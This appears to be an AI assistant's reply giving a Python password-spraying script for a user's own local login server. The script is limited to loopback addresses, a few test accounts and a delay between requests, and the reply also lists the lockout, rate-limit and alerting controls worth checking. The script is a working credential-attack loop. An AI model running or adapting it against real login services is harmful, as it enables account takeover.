@@ -1,0 +1,236 @@
+Yes. Since you're testing your own local client and server, you can use Python to simulate a controlled password-spraying test.
+
+The script below uses:
+
+* One candidate password.
+
+* Multiple test accounts.
+
+* One login attempt per account.
+
+* A delay between requests.
+
+* No proxy rotation, concurrency or password lists.
+
+* A localhost-only restriction to prevent accidentally targeting an external service.
+
+### 1\. Install Python dependency
+
+On Ubuntu:
+
+```bash
+mkdir -p ~/password-spray-lab
+cd ~/password-spray-lab
+
+python3 -m venv venv
+source venv/bin/activate
+
+pip install requests
+```
+
+### 2\. Python password-spraying demonstration
+
+Create the file:
+
+```bash
+nano password_spray_lab.py
+```
+
+Paste this script:
+
+```python
+
+import requests
+import time
+from urllib.parse import urlparse
+from ipaddress import ip_address
+
+# LOCAL LAB CONFIGURATION
+LOGIN_URL = "http://127.0.0.1:5000/login"
+
+# Only accounts you created for your local lab
+TEST_USERS = [
+    "testuser1",
+    "testuser2",
+    "testuser3",
+    "testuser4",
+]
+
+# One candidate password shared across the accounts
+CANDIDATE_PASSWORD = "LabTestPassword123!"
+
+# Delay between login attempts
+DELAY_SECONDS = 3
+
+# Maximum accounts per run
+MAX_ACCOUNTS = 10
+
+def validate_local_url(url):
+    parsed = urlparse(url)
+
+    if parsed.scheme != "http":
+        raise ValueError("Use HTTP only for this isolated local lab.")
+
+    host = parsed.hostname
+
+    if host == "localhost":
+        return
+
+    try:
+        address = ip_address(host)
+    except ValueError:
+        raise ValueError("Target must be localhost or a loopback IP.")
+
+    if not address.is_loopback:
+        raise ValueError("Target must be a loopback address.")
+
+def main():
+    validate_local_url(LOGIN_URL)
+
+    if not TEST_USERS or len(TEST_USERS) > MAX_ACCOUNTS:
+        raise ValueError("Use between 1 and 10 test accounts.")
+
+    session = requests.Session()
+
+    print("\nLOCAL PASSWORD-SPRAYING DEMONSTRATION")
+    print("------------------------------------")
+    print("Target:", LOGIN_URL)
+    print("Accounts:", len(TEST_USERS))
+    print("Candidate password: [hidden]")
+    print("Delay:", DELAY_SECONDS, "seconds")
+    print()
+
+    for index, username in enumerate(TEST_USERS, start=1):
+
+        try:
+            response = session.post(
+                LOGIN_URL,
+                json={
+                    "username": username,
+                    "password": CANDIDATE_PASSWORD
+                },
+                timeout=5,
+                allow_redirects=False
+            )
+
+            print(f"Account {index}: {username}")
+            print("HTTP status:", response.status_code)
+
+            if response.status_code == 429:
+                print("RATE LIMIT DETECTED")
+                print("Retry-After:",
+                      response.headers.get("Retry-After"))
+                print("Stopping test.")
+                break
+
+            if response.status_code in (200, 201):
+                print("Authentication may have succeeded.")
+                print("Stopping to avoid further login attempts.")
+                break
+
+            elif response.status_code in (401, 403):
+                print("Authentication rejected.")
+
+            else:
+                print("Unexpected response; inspect server logs.")
+
+        except requests.RequestException as error:
+            print("Request failed:", error)
+            break
+
+        if index < len(TEST_USERS):
+            time.sleep(DELAY_SECONDS)
+
+    print("\nTest completed. Review your server logs.")
+
+if __name__ == "__main__":
+    main()
+```
+
+### 3\. Run the script
+
+Make sure your local server is running first.
+
+```bash
+python3 password_spray_lab.py
+```
+
+Example output:
+
+```text
+LOCAL PASSWORD-SPRAYING DEMONSTRATION
+------------------------------------
+Target: http://127.0.0.1:5000/login
+Accounts: 4
+Candidate password: [hidden]
+Delay: 3 seconds
+
+Account 1: testuser1
+HTTP status: 401
+Authentication rejected.
+
+Account 2: testuser2
+HTTP status: 401
+Authentication rejected.
+
+Account 3: testuser3
+HTTP status: 429
+RATE LIMIT DETECTED
+Stopping test.
+```
+
+The example output is illustrative, not a result from your server.
+
+### 4\. Understand what happens
+
+Password spraying pattern
+
+One candidate password
+
+testuser1
+
+One attempt
+
+testuser2
+
+One attempt
+
+testuser3
+
+One attempt
+
+testuser4
+
+One attempt
+
+Observe server-side authentication controls
+
+This differs from ordinary brute force:
+
+| Password spraying                      | Brute force                            |
+| -------------------------------------- | -------------------------------------- |
+| One password against multiple accounts | Multiple passwords against one account |
+| Attempts distributed across users      | Attempts concentrated on one user      |
+| Tests cross-account detection          | Tests per-account protection           |
+
+### 5\. What to inspect on your server
+
+During the test, monitor:
+
+* Failed login counters.
+
+* Per-account attempt limits.
+
+* Per-IP attempt limits.
+
+* Account lockout or temporary throttling.
+
+* HTTP `429` responses.
+
+* Security event logs.
+
+* Alerts for repeated failures across different accounts.
+
+A strong server should detect suspicious patterns across accounts, not just repeated failures against one account.
+
+Next: If you share your local server's login route and the expected JSON request format, I can adapt this script to your actual client-server implementation and help you build a server-side password-spraying detection mechanism.
